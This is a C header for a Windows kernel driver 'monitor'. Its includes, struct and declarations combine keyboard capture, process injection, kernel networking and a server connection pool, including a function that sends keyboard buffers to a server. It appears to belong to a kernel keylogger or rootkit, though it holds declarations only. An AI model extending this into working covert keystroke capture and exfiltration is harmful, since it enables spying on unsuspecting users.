#pragma once

#include <inc/drvmain.h>

#include <inc/sysworker.h>
#include <inc/mwsk.h>
#include <inc/keybrd.h>
#include <inc/inject.h>
#include <inc/thash.h>
#include <inc/pallocator.h>
#include <h/drvioctl.h>
#include <inc/processtable.h>
#include <inc/servercon.h>

#define MONITOR_STATE_STOPPED 1
#define MONITOR_STATE_STARTED 2

typedef struct _MONITOR {
	PDRIVER_OBJECT	DriverObject;
	SYSWORKER		NetWorker;
	SYSWORKER		RequestWorker;
	PMWSK_CONTEXT   WskContext;
	volatile LONG	State;
	KGUARDED_MUTEX	Mutex;
	INJECT_BLOCK	Inject;
	PROCESS_TABLE	ProcessTable;
	KBD_CONTEXT		Kbd;
	SERVER_CON_POOL ConPool;
} MONITOR, *PMONITOR;

VOID
	MonitorInit(PDRIVER_OBJECT	DriverObject);

NTSTATUS
    MonitorStart();

NTSTATUS
    MonitorStop();

NTSTATUS
	MonitorOpenWinsta(POPEN_WINSTA Winsta);

NTSTATUS
	MonitorOpenDesktop(POPEN_DESKTOP openDesktop);

VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry);


PMONITOR
	MonitorGetInstance(VOID);

PSREQUEST
	MonitorCallServer(PSREQUEST Request);
